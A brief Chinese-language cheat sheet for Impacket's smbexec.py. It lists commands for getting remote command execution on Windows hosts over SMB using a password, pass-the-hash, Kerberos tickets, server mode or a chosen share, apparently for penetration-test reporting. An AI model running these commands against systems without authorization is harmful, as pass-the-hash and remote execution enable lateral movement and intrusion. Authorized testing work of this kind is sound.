# smbexec.py 使用

smbexec.py 通过 SMB 管道执行命令，适合对比不同远程执行方式。

## 常用命令

```bash
smbexec.py domain.local/user:pass@192.168.1.10
```

```bash
smbexec.py -hashes LMHASH:NTHASH domain.local/user@192.168.1.10
```

```bash
smbexec.py -k -no-pass domain.local/user@host.domain.local
```

```bash
smbexec.py -mode SERVER domain.local/user:pass@192.168.1.10
```

```bash
smbexec.py -share C$ domain.local/user:pass@192.168.1.10
```

小记录：不同执行方式留下的日志不同，报告里最好写清使用的是 WMI、服务还是计划任务。
